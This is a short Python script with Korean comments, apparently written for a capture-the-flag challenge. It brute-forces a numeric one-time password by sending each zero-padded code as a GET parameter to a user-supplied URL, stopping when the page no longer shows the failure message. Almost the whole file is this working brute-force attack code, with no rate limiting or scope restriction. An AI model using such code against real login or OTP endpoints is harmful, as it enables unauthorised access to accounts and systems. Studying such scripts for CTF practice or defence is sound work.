import requests

startNum = int(input("Starting Number is? : "))
endNum = int(input("Ending Number is? : "))
digits = len(str(endNum))


print("\n type link ex : ctf.segfaulthub.com:1129/6/checkOTP.php")
links = "http://"+input("Link(without parameter) : http://")
print("\n type parameter ex : otpNum")
parameter = "?"+input("Parameter Name : htpp://"+links+"?")+"="

print("\n type fail message ex : Login Fail...")
failMessage = input("fail Message : ")


#인풋 보기
print("Starting Number = "+str(startNum)+"\n"+"Ending Number = "+str(endNum)+"\n"+"Digits : "+str(digits)+"\n")
print("links = "+links+"\n"+"Parameter = "+parameter+"\n")


#실제 크래킹 부분
print("[*] Password Crack Start...")
for i in range(startNum,endNum):
    tryNum = str(i).zfill(digits)
    print("[>] Try : [" + tryNum + "]", end="\r")
    response = requests.get(links + parameter + tryNum)
    if failMessage not in response.text:
        print("[+] Found Code : " + tryNum)
        break




#종료 안하고 기다리게 하기
while True:
  print("Waiting...", end="\r")
  

